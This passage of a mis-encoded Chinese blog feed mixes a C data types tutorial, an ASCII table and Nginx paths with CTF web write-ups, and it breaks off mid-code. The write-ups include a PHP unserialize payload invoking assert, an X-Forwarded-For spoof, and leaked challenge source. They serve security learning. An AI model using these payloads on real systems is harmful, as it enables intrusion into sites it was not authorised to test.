ç±»åž‹ï¼š</strong> ç±»åž‹è¯´æ˜Žç¬¦ <em>void</em> è¡¨æ˜Žæ²¡æœ‰å¯ç”¨çš„å€¼ã€‚</td></tr><tr><td align="left">4</td><td align="left"><strong>æ´¾ç”Ÿç±»åž‹ï¼š</strong> å®ƒä»¬åŒ…æ‹¬ï¼šæŒ‡é’ˆç±»åž‹ã€æ•°ç»„ç±»åž‹ã€ç»“æž„ç±»åž‹ã€å…±ç”¨ä½“ç±»åž‹å’Œå‡½æ•°ç±»åž‹ã€‚</td></tr></tbody></table><p>æ•°ç»„ç±»åž‹å’Œç»“æž„ç±»åž‹ç»Ÿç§°ä¸ºèšåˆç±»åž‹ã€‚å‡½æ•°çš„ç±»åž‹æŒ‡çš„æ˜¯å‡½æ•°è¿”å›žå€¼çš„ç±»åž‹ã€‚åœ¨æœ¬ç« èŠ‚æŽ¥ä¸‹æ¥çš„éƒ¨åˆ†æˆ‘ä»¬å°†ä»‹ç»åŸºæœ¬ç±»åž‹ï¼Œå…¶ä»–å‡ ç§ç±»åž‹ä¼šåœ¨åŽè¾¹å‡ ä¸ªç« èŠ‚ä¸­è¿›è¡Œè®²è§£ã€‚</p><h2 id="æ•´æ•°ç±»åž‹"><a href="#æ•´æ•°ç±»åž‹" class="headerlink" title="æ•´æ•°ç±»åž‹"></a>æ•´æ•°ç±»åž‹</h2><p>ä¸‹è¡¨åˆ—å‡ºäº†å…³äºŽæ ‡å‡†æ•´æ•°ç±»åž‹çš„å­˜å‚¨å¤§å°å’Œå€¼èŒƒå›´çš„ç»†èŠ‚ï¼š</p><table><thead><tr><th align="left">ç±»åž‹</th><th align="left">å­˜å‚¨å¤§å°</th><th align="left">å€¼èŒƒå›´</th></tr></thead><tbody><tr><td align="left">char</td><td align="left">1 å­—èŠ‚</td><td align="left">-128 åˆ° 127 æˆ– 0 åˆ° 255</td></tr><tr><td align="left">unsigned char</td><td align="left">1 å­—èŠ‚</td><td align="left">0 åˆ° 255</td></tr><tr><td align="left">signed char</td><td align="left">1 å­—èŠ‚</td><td align="left">-128 åˆ° 127</td></tr><tr><td align="left">int</td><td align="left">2 æˆ– 4 å­—èŠ‚</td><td align="left">-32,768 åˆ° 32,767 æˆ– -2,147,483,648 åˆ° 2,147,483,647</td></tr><tr><td align="left">unsigned int</td><td align="left">2 æˆ– 4 å­—èŠ‚</td><td align="left">0 åˆ° 65,535 æˆ– 0 åˆ° 4,294,967,295</td></tr><tr><td align="left">short</td><td align="left">2 å­—èŠ‚</td><td align="left">-32,768 åˆ° 32,767</td></tr><tr><td align="left">unsigned short</td><td align="left">2 å­—èŠ‚</td><td align="left">0 åˆ° 65,535</td></tr><tr><td align="left">long</td><td align="left">4 å­—èŠ‚</td><td align="left">-2,147,483,648 åˆ° 2,147,483,647</td></tr><tr><td align="left">unsigned long</td><td align="left">4 å­—èŠ‚</td><td align="left">0 åˆ° 4,294,967,295</td></tr></tbody></table><blockquote><p>æ³¨æ„ï¼Œå„ç§ç±»åž‹çš„å­˜å‚¨å¤§å°ä¸Žç³»ç»Ÿä½æ•°æœ‰å…³ï¼Œä½†ç›®å‰é€šç”¨çš„ä»¥64ä½ç³»ç»Ÿä¸ºä¸»ã€‚</p></blockquote><p>ä¸ºäº†å¾—åˆ°æŸä¸ªç±»åž‹æˆ–æŸä¸ªå˜é‡åœ¨ç‰¹å®šå¹³å°ä¸Šçš„å‡†ç¡®å¤§å°ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ <strong>sizeof</strong> è¿ç®—ç¬¦ã€‚è¡¨è¾¾å¼ <em>sizeof(type)</em> å¾—åˆ°å¯¹è±¡æˆ–ç±»åž‹çš„å­˜å‚¨å­—èŠ‚å¤§å°ã€‚ä¸‹é¢çš„å®žä¾‹æ¼”ç¤ºäº†èŽ·å– int ç±»åž‹çš„å¤§å°ï¼š</p><h2 id="å®žä¾‹"><a href="#å®žä¾‹" class="headerlink" title="å®žä¾‹"></a>å®žä¾‹</h2><p>#include &lt;stdio.h&gt; #include &lt;limits.h&gt;  int main() {   printf(â€œint å­˜å‚¨å¤§å° : %lu \nâ€, sizeof(int));      return 0; }</p><p><strong>%lu</strong> ä¸º 32 ä½æ— ç¬¦å·æ•´æ•°ï¼Œè¯¦ç»†è¯´æ˜ŽæŸ¥çœ‹ <a href="https://www.runoob.com/cprogramming/c-function-printf.html">C åº“å‡½æ•° - printf()</a>ã€‚</p><p>å½“æ‚¨åœ¨ Linux ä¸Šç¼–è¯‘å¹¶æ‰§è¡Œä¸Šé¢çš„ç¨‹åºæ—¶ï¼Œå®ƒä¼šäº§ç”Ÿä¸‹åˆ—ç»“æžœï¼š</p><pre><code>int å­˜å‚¨å¤§å° : 4 </code></pre><h2 id="æµ®ç‚¹ç±»åž‹"><a href="#æµ®ç‚¹ç±»åž‹" class="headerlink" title="æµ®ç‚¹ç±»åž‹"></a>æµ®ç‚¹ç±»åž‹</h2><p>ä¸‹è¡¨åˆ—å‡ºäº†å…³äºŽæ ‡å‡†æµ®ç‚¹ç±»åž‹çš„å­˜å‚¨å¤§å°ã€å€¼èŒƒå›´å’Œç²¾åº¦çš„ç»†èŠ‚ï¼š</p><table><thead><tr><th align="left">ç±»åž‹</th><th align="left">å­˜å‚¨å¤§å°</th><th align="left">å€¼èŒƒå›´</th><th align="left">ç²¾åº¦</th></tr></thead><tbody><tr><td align="left">float</td><td align="left">4 å­—èŠ‚</td><td align="left">1.2E-38 åˆ° 3.4E+38</td><td align="left">6 ä½å°æ•°</td></tr><tr><td align="left">double</td><td align="left">8 å­—èŠ‚</td><td align="left">2.3E-308 åˆ° 1.7E+308</td><td align="left">15 ä½å°æ•°</td></tr><tr><td align="left">long double</td><td align="left">16 å­—èŠ‚</td><td align="left">3.4E-4932 åˆ° 1.1E+4932</td><td align="left">19 ä½å°æ•°</td></tr></tbody></table><p>å¤´æ–‡ä»¶ float.h å®šä¹‰äº†å®ï¼Œåœ¨ç¨‹åºä¸­å¯ä»¥ä½¿ç”¨è¿™äº›å€¼å’Œå…¶ä»–æœ‰å…³å®žæ•°äºŒè¿›åˆ¶è¡¨ç¤ºçš„ç»†èŠ‚ã€‚ä¸‹é¢çš„å®žä¾‹å°†è¾“å‡ºæµ®ç‚¹ç±»åž‹å ç”¨çš„å­˜å‚¨ç©ºé—´ä»¥åŠå®ƒçš„èŒƒå›´å€¼ï¼š</p><h2 id="å®žä¾‹-1"><a href="#å®žä¾‹-1" class="headerlink" title="å®žä¾‹"></a>å®žä¾‹</h2><p>#include &lt;stdio.h&gt; #include &lt;float.h&gt;  int main() {   printf(â€œfloat å­˜å‚¨æœ€å¤§å­—èŠ‚æ•° : %lu \nâ€, sizeof(float));   printf(â€œfloat æœ€å°å€¼: %E\nâ€, FLT_MIN );   printf(â€œfloat æœ€å¤§å€¼: %E\nâ€, FLT_MAX );   printf(â€œç²¾åº¦å€¼: %d\nâ€, FLT_DIG );      return 0; }</p><p><strong>%E</strong> ä¸ºä»¥æŒ‡æ•°å½¢å¼è¾“å‡ºå•ã€åŒç²¾åº¦å®žæ•°ï¼Œè¯¦ç»†è¯´æ˜ŽæŸ¥çœ‹ <a href="https://www.runoob.com/cprogramming/c-function-printf.html">C åº“å‡½æ•° - printf()</a>ã€‚</p><p>å½“æ‚¨åœ¨ Linux ä¸Šç¼–è¯‘å¹¶æ‰§è¡Œä¸Šé¢çš„ç¨‹åºæ—¶ï¼Œå®ƒä¼šäº§ç”Ÿä¸‹åˆ—ç»“æžœï¼š</p><pre><code>float å­˜å‚¨æœ€å¤§å­—èŠ‚æ•° : 4 float æœ€å°å€¼: 1.175494E-38float æœ€å¤§å€¼: 3.402823E+38ç²¾åº¦å€¼: 6</code></pre><h2 id="void-ç±»åž‹"><a href="#void-ç±»åž‹" class="headerlink" title="void ç±»åž‹"></a>void ç±»åž‹</h2><p>void ç±»åž‹æŒ‡å®šæ²¡æœ‰å¯ç”¨çš„å€¼ã€‚å®ƒé€šå¸¸ç”¨äºŽä»¥ä¸‹ä¸‰ç§æƒ…å†µä¸‹ï¼š</p><table><thead><tr><th align="left">åºå·</th><th align="left">ç±»åž‹ä¸Žæè¿°</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>å‡½æ•°è¿”å›žä¸ºç©º</strong> C ä¸­æœ‰å„ç§å‡½æ•°éƒ½ä¸è¿”å›žå€¼ï¼Œæˆ–è€…æ‚¨å¯ä»¥è¯´å®ƒä»¬è¿”å›žç©ºã€‚ä¸è¿”å›žå€¼çš„å‡½æ•°çš„è¿”å›žç±»åž‹ä¸ºç©ºã€‚ä¾‹å¦‚ <strong>void exit (int status);</strong></td></tr><tr><td align="left">2</td><td align="left"><strong>å‡½æ•°å‚æ•°ä¸ºç©º</strong> C ä¸­æœ‰å„ç§å‡½æ•°ä¸æŽ¥å—ä»»ä½•å‚æ•°ã€‚ä¸å¸¦å‚æ•°çš„å‡½æ•°å¯ä»¥æŽ¥å—ä¸€ä¸ª voidã€‚ä¾‹å¦‚ <strong>int rand(void);</strong></td></tr><tr><td align="left">3</td><td align="left"><strong>æŒ‡é’ˆæŒ‡å‘ void</strong> ç±»åž‹ä¸º void * çš„æŒ‡é’ˆä»£è¡¨å¯¹è±¡çš„åœ°å€ï¼Œè€Œä¸æ˜¯ç±»åž‹ã€‚ä¾‹å¦‚ï¼Œå†…å­˜åˆ†é…å‡½æ•° <strong>void *malloc( size_t size );</strong> è¿”å›žæŒ‡å‘ void çš„æŒ‡é’ˆï¼Œå¯ä»¥è½¬æ¢ä¸ºä»»ä½•æ•°æ®ç±»åž‹ã€‚</td></tr></tbody></table><p>å¦‚æžœçŽ°åœ¨æ‚¨è¿˜æ˜¯æ— æ³•å®Œå…¨ç†è§£ void ç±»åž‹ï¼Œä¸ç”¨å¤ªæ‹…å¿ƒï¼Œåœ¨åŽç»­çš„ç« èŠ‚ä¸­æˆ‘ä»¬å°†ä¼šè¯¦ç»†è®²è§£è¿™äº›æ¦‚å¿µã€‚</p><p> <a href="https://www.runoob.com/cprogramming/c-basic-syntax.html">C åŸºæœ¬è¯­æ³•</a></p><p><a href="https://www.runoob.com/cprogramming/c-variables.html">C å˜é‡</a> </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ASCIIç è¡¨</title>
      <link href="2021/07/16/ascii-ma-biao/"/>
      <url>2021/07/16/ascii-ma-biao/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="left">ASCIIå€¼</th><th align="left">æŽ§åˆ¶å­—ç¬¦</th><th align="left">ASCIIå€¼</th><th align="left">æŽ§åˆ¶å­—ç¬¦</th><th align="left">ASCIIå€¼</th><th align="left">æŽ§åˆ¶å­—ç¬¦</th><th align="left">ASCIIå€¼</th><th align="left">æŽ§åˆ¶å­—ç¬¦</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">NUT</td><td align="left">32</td><td align="left">(space)</td><td align="left">64</td><td align="left">@</td><td align="left">96</td><td align="left">ã€</td></tr><tr><td align="left">1</td><td align="left">SOH</td><td align="left">33</td><td align="left">!</td><td align="left">65</td><td align="left">A</td><td align="left">97</td><td align="left">a</td></tr><tr><td align="left">2</td><td align="left">STX</td><td align="left">34</td><td align="left">â€œ</td><td align="left">66</td><td align="left">B</td><td align="left">98</td><td align="left">b</td></tr><tr><td align="left">3</td><td align="left">ETX</td><td align="left">35</td><td align="left">#</td><td align="left">67</td><td align="left">C</td><td align="left">99</td><td align="left">c</td></tr><tr><td align="left">4</td><td align="left">EOT</td><td align="left">36</td><td align="left">$</td><td align="left">68</td><td align="left">D</td><td align="left">100</td><td align="left">d</td></tr><tr><td align="left">5</td><td align="left">ENQ</td><td align="left">37</td><td align="left">%</td><td align="left">69</td><td align="left">E</td><td align="left">101</td><td align="left">e</td></tr><tr><td align="left">6</td><td align="left">ACK</td><td align="left">38</td><td align="left">&amp;</td><td align="left">70</td><td align="left">F</td><td align="left">102</td><td align="left">f</td></tr><tr><td align="left">7</td><td align="left">BEL</td><td align="left">39</td><td align="left">,</td><td align="left">71</td><td align="left">G</td><td align="left">103</td><td align="left">g</td></tr><tr><td align="left">8</td><td align="left">BS</td><td align="left">40</td><td align="left">(</td><td align="left">72</td><td align="left">H</td><td align="left">104</td><td align="left">h</td></tr><tr><td align="left">9</td><td align="left">HT</td><td align="left">41</td><td align="left">)</td><td align="left">73</td><td align="left">I</td><td align="left">105</td><td align="left">i</td></tr><tr><td align="left">10</td><td align="left">LF</td><td align="left">42</td><td align="left">*</td><td align="left">74</td><td align="left">J</td><td align="left">106</td><td align="left">j</td></tr><tr><td align="left">11</td><td align="left">VT</td><td align="left">43</td><td align="left">+</td><td align="left">75</td><td align="left">K</td><td align="left">107</td><td align="left">k</td></tr><tr><td align="left">12</td><td align="left">FF</td><td align="left">44</td><td align="left">,</td><td align="left">76</td><td align="left">L</td><td align="left">108</td><td align="left">l</td></tr><tr><td align="left">13</td><td align="left">CR</td><td align="left">45</td><td align="left">-</td><td align="left">77</td><td align="left">M</td><td align="left">109</td><td align="left">m</td></tr><tr><td align="left">14</td><td align="left">SO</td><td align="left">46</td><td align="left">.</td><td align="left">78</td><td align="left">N</td><td align="left">110</td><td align="left">n</td></tr><tr><td align="left">15</td><td align="left">SI</td><td align="left">47</td><td align="left">/</td><td align="left">79</td><td align="left">O</td><td align="left">111</td><td align="left">o</td></tr><tr><td align="left">16</td><td align="left">DLE</td><td align="left">48</td><td align="left">0</td><td align="left">80</td><td align="left">P</td><td align="left">112</td><td align="left">p</td></tr><tr><td align="left">17</td><td align="left">DCI</td><td align="left">49</td><td align="left">1</td><td align="left">81</td><td align="left">Q</td><td align="left">113</td><td align="left">q</td></tr><tr><td align="left">18</td><td align="left">DC2</td><td align="left">50</td><td align="left">2</td><td align="left">82</td><td align="left">R</td><td align="left">114</td><td align="left">r</td></tr><tr><td align="left">19</td><td align="left">DC3</td><td align="left">51</td><td align="left">3</td><td align="left">83</td><td align="left">S</td><td align="left">115</td><td align="left">s</td></tr><tr><td align="left">20</td><td align="left">DC4</td><td align="left">52</td><td align="left">4</td><td align="left">84</td><td align="left">T</td><td align="left">116</td><td align="left">t</td></tr><tr><td align="left">21</td><td align="left">NAK</td><td align="left">53</td><td align="left">5</td><td align="left">85</td><td align="left">U</td><td align="left">117</td><td align="left">u</td></tr><tr><td align="left">22</td><td align="left">SYN</td><td align="left">54</td><td align="left">6</td><td align="left">86</td><td align="left">V</td><td align="left">118</td><td align="left">v</td></tr><tr><td align="left">23</td><td align="left">TB</td><td align="left">55</td><td align="left">7</td><td align="left">87</td><td align="left">W</td><td align="left">119</td><td align="left">w</td></tr><tr><td align="left">24</td><td align="left">CAN</td><td align="left">56</td><td align="left">8</td><td align="left">88</td><td align="left">X</td><td align="left">120</td><td align="left">x</td></tr><tr><td align="left">25</td><td align="left">EM</td><td align="left">57</td><td align="left">9</td><td align="left">89</td><td align="left">Y</td><td align="left">121</td><td align="left">y</td></tr><tr><td align="left">26</td><td align="left">SUB</td><td align="left">58</td><td align="left">:</td><td align="left">90</td><td align="left">Z</td><td align="left">122</td><td align="left">z</td></tr><tr><td align="left">27</td><td align="left">ESC</td><td align="left">59</td><td align="left">;</td><td align="left">91</td><td align="left">[</td><td align="left">123</td><td align="left">{</td></tr><tr><td align="left">28</td><td align="left">FS</td><td align="left">60</td><td align="left">&lt;</td><td align="left">92</td><td align="left">/</td><td align="left">124</td><td align="left">|</td></tr><tr><td align="left">29</td><td align="left">GS</td><td align="left">61</td><td align="left">=</td><td align="left">93</td><td align="left">]</td><td align="left">125</td><td align="left">}</td></tr><tr><td align="left">30</td><td align="left">RS</td><td align="left">62</td><td align="left">&gt;</td><td align="left">94</td><td align="left">^</td><td align="left">126</td><td align="left">`</td></tr><tr><td align="left">31</td><td align="left">US</td><td align="left">63</td><td align="left">?</td><td align="left">95</td><td align="left">_</td><td align="left">127</td><td align="left">DEL</td></tr></tbody></table><h3 id="ç‰¹æ®Šå­—ç¬¦æŸ¥è¯¢"><a href="#ç‰¹æ®Šå­—ç¬¦æŸ¥è¯¢" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦æŸ¥è¯¢"></a>ç‰¹æ®Šå­—ç¬¦æŸ¥è¯¢</h3><table><thead><tr><th>NULç©º</th><th>VT åž‚ç›´åˆ¶è¡¨</th><th>SYN ç©ºè½¬åŒæ­¥</th></tr></thead><tbody><tr><td>STX æ­£æ–‡å¼€å§‹</td><td>CR å›žè½¦</td><td>CAN ä½œåºŸ</td></tr><tr><td>ETX æ­£æ–‡ç»“æŸ</td><td>SO ç§»ä½è¾“å‡º</td><td>EM çº¸å°½</td></tr><tr><td>EOY ä¼ è¾“ç»“æŸ</td><td>SI ç§»ä½è¾“å…¥</td><td>SUB æ¢ç½®</td></tr><tr><td>ENQ è¯¢é—®å­—ç¬¦</td><td>DLE ç©ºæ ¼</td><td>ESC æ¢ç </td></tr><tr><td>ACK æ‰¿è®¤</td><td>DC1 è®¾å¤‡æŽ§åˆ¶1</td><td>FS æ–‡å­—åˆ†éš”ç¬¦</td></tr><tr><td>BEL æŠ¥è­¦</td><td>DC2 è®¾å¤‡æŽ§åˆ¶2</td><td>GS ç»„åˆ†éš”ç¬¦</td></tr><tr><td>BS é€€ä¸€æ ¼</td><td>DC3 è®¾å¤‡æŽ§åˆ¶3</td><td>RS è®°å½•åˆ†éš”ç¬¦</td></tr><tr><td>HT æ¨ªå‘åˆ—è¡¨</td><td>DC4 è®¾å¤‡æŽ§åˆ¶4</td><td>US å•å…ƒåˆ†éš”ç¬¦</td></tr><tr><td>LF æ¢è¡Œ</td><td>NAK å¦å®š</td><td>DEL åˆ é™¤</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF:2020-ReadlezPHP</title>
      <link href="2021/07/15/npuctf-2020-readlezphp/"/>
      <url>2021/07/15/npuctf-2020-readlezphp/</url>
      
        <content type="html"><![CDATA[<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token shell-comment comment">#error_reporting(0);</span><span class="token keyword">class</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string">"Y-m-d h:i:s"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token string">"date"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">;</span>        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>@<span class="token variable">$ppp</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">2021</span><span class="token operator">-</span><span class="token number">07</span><span class="token operator">-</span><span class="token number">14</span> <span class="token number">05</span><span class="token punctuation">:</span><span class="token number">03</span><span class="token punctuation">:</span><span class="token number">14</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>data<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"HelloPhp"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"phpinfo()"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"assert"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/2021/07/15/npuctf-2020-readlezphp/image-20210715012015629.png" alt="image-20210715012015629"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Nginxé‡è¦æ–‡ä»¶ä½ç½®</title>
      <link href="2021/07/14/nginx-chong-yao-wen-jian-wei-zhi/"/>
      <url>2021/07/14/nginx-chong-yao-wen-jian-wei-zhi/</url>
      
        <content type="html"><![CDATA[<ul><li>é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx</li><li>ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf</li><li>ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service</li><li>æ¨¡å—ï¼š/usr/lisb64/nginx/modules</li><li>åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx</li><li>ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html</li><li>æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx</li><li>é…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š/usr/local/nginx/conf/nginx.conf</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF:2020-PYWebsite</title>
      <link href="2021/07/13/mrctf-2020-pywebsite/"/>
      <url>2021/07/13/mrctf-2020-pywebsite/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/07/13/mrctf-2020-pywebsite/image-20210713141120949.png" alt="image-20210713141120949"></p><p>ç‚¹å‡»è´­ä¹°è·³å‡ºä¸€ä¸ªå¾®ä¿¡äºŒç»´ç </p><p><img src="/2021/07/13/mrctf-2020-pywebsite/image-20210713141136727.png" alt="image-20210713141136727"></p><p>æ‰«å‡ºæ¥æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="/2021/07/13/mrctf-2020-pywebsite/image-20210713141103134.png" alt="image-20210713141103134"></p><p>F12å‘çŽ°è¿™æ ·ä¸€ä¸²ä»£ç ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">enc</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">{</span>      hash <span class="token operator">=</span> <span class="token function">hex_md5</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> hash<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">var</span> code <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"vcode"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>code <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">hex_md5</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"0cd4da0223c0b280829dc3ea458d655c"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"æ‚¨é€šè¿‡äº†éªŒè¯ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"./flag.php"</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>          <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"ä½ çš„æŽˆæƒç ä¸æ­£ç¡®ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"è¯·è¾“å…¥æŽˆæƒç "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>è®¿é—®flag.php</p><p><img src="/2021/07/13/mrctf-2020-pywebsite/image-20210713141420745.png" alt="image-20210713141420745"></p><p>æç¤ºipï¼š</p><pre><code>X-Forwarded-For: 127.0.0.1</code></pre><p><img src="/2021/07/13/mrctf-2020-pywebsite/image-20210713141543107.png" alt="image-20210713141543107"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>0CTF:2016-PiaPiaPia</title>
      <link href="2021/07/12/0ctf-2016-piapiapia/"/>
      <url>2021/07/12/0ctf-2016-piapiapia/</url>
      
        <content type="html"><![CDATA[<p>æ‰«æåˆ°äº†<a href="http://www.zipä¸‹è½½ä¸‹æ¥/">www.zipä¸‹è½½ä¸‹æ¥</a></p><p><img src="/2021/07/12/0ctf-2016-piapiapia/image-20210711221607725.png" alt="image-20210711221607725"></p><p>register-&gt;login-&gt;update-&gt;profile</p><p><strong>config.php</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'hostname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">;</span>    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'root'</span><span class="token punctuation">;</span>    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>update.php</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Login First'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^\d{11}$/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Invalid phone'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token 